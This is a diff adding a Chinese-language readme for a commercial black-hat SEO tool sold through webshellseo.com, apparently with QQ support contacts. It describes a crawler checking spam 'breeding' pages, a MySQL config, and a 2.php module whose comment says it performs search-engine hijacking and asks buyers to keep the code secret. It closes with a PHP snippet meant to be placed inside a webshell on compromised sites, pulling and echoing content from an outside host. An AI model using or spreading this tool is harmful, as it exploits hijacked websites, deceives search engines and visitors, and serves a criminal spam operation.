@@ -1,0 +1,36 @@
+http://webshellseo.com     出品必出精品
+客服QQ:315284666
+技术支持QQ:2602159946
+
+
+自动优化
+自动对繁殖页进行检测   状态和标题
+main.exe  
+links.txt   URL列表一行一条自动添加到数据库(URL 是主键可以过滤掉重复数据)
+url.txt     把存活的URL导出(可以把这个文件先删除了  软件启动的时候会自动从新生成)
+会对数据内容实现自动测试
+
+server.ini
+[Server] ;MYSQL配置
+Server=localhost   ;主机
+Username=root      ;用户名
+password=xxxxxx ;密码
+db=spider_url    ;数据库url
+
+2.php      
+/*
+ * php部分
+ * 当你看到本段代码是有不懂请联系  技术支持QQ:2602159946
+ * 作为商业用途请不要对外公开代码  防止技术扩散
+ * 主要实现   搜索引擎  劫持
+ * 每次刷新都是是不同内容
+ * 蜘蛛第一次过是一次内容
+ * 第2次蜘蛛过来内容相同
+ */
+
+
+在WEBSHELL中这样调用      这样调用判断不出来蜘蛛   只能实现每次刷新不同内容
+<?php
+    $html=file_get_contents("http://www.xxxxx.org/avcpa/2.php");
+    echo $html;
+?>
